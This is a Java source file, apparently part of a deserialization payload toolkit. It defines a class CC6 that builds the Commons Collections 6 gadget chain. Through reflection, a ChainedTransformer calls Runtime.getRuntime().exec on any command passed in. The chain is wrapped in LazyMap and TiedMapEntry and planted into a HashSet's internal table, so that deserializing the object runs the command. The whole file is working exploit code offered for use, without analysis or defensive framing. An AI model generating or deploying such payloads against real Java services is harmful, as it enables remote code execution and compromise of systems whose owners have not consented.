package org.gadget;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.gadget.inter.Gadget;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CC6 implements Gadget {
    public Object getObject(String common,String path) throws Exception {
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{common})
        });
        HashMap hashMap = new HashMap();
        Map decorate = LazyMap.decorate(hashMap, chain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,"foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        f = HashSet.class.getDeclaredField("map");
        f.setAccessible(true);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = HashMap.class.getDeclaredField("table");
        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        keyField = node.getClass().getDeclaredField("key");
        keyField.setAccessible(true);
        keyField.set(node, tiedMapEntry);

        return map;
    }
}
